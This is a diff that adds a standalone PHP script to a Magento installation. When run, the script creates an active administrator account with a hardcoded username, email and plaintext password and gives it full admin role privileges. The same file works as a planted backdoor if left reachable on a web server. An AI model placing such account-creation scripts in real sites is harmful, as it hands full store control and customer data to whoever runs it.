@@ -1,0 +1,17 @@
+<?php 
+    require_once('app/Mage.php');
+    umask(0);
+    Mage::app();
+    $user = Mage::getModel('admin/user')->setData(array(
+            'username' => 'davidduong',
+            'firstname' => 'David',
+            'lastname' => 'Duong',
+            'email' => 'duongquyet90@gmail.com',
+            'password' => 'duongquyet%123',
+            'is_active' => 1
+        ))
+        ->save();
+    $user->setRoleIds(array(1))
+        ->setRoleUserId($user->getUserId())
+        ->saveRelations();
+?>
